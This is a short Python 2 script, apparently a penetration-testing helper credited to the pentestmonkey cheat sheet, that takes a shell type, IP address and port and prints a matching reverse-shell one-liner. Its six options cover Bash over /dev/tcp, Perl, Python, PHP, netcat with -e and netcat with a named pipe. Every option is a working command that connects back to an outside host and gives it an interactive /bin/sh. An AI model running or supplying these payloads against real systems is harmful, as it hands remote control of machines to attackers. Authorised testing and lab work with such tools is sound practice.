#CANNOT FIND ORIGINAL SOURCE OF THIS. IF SOMEONE CAN FIND IT PLEASE NOTIFY ME.


#!/usr/bin/env python

# pentest monkey shells
# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
import re
import sys

banner="""--==<Pentest-Monkey-Reverse-shell>==--
Usage: monkey <type> <HOST> <PORT>

Types:
[1] Bash
[2] Perl
[3] Python
[4] PHP
[5] Netcat
[6] Netcat (named pipes)
"""

def isIp(ip):
    ip_pattern = re.compile("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
    return (ip_pattern.match(ip) != None)

def isPort(port):
    return (port.isdigit and int(port) > 1 and int(port) < 65535)

def quit(msg):
    sys.stderr.writelines(msg)
    exit(0)


def main():
    if(len(sys.argv) != 4):
        print banner
        exit(0)
    
    shell = sys.argv[1]
    host = sys.argv[2]
    port = sys.argv[3]
    
    if(shell.isdigit and int(shell)>=1 and int(shell) <= 6) == False:
        quit("[!] Invalid type given.")
    
    if(isIp(host) == False):
        quit("[!] Invalid IP address given.")
    if(isPort(port) == False):
        quit("[!] Invalid port given.")
    
    shell = int(shell)

    if(shell == 1):
       print "bash -i >& /dev/tcp/%s/%s 0>&1" % (host, port)
    elif(shell == 2):
        print "use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};" % (host, port)
    elif(shell == 3):
        print "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" % (host, port)
    elif(shell == 4):
        print "$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");" % (host, port)
    elif(shell == 5):
        print "nc -e /bin/sh %s %s"  % (host, port)
    elif(shell == 6):
        print "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (host, port)


main()




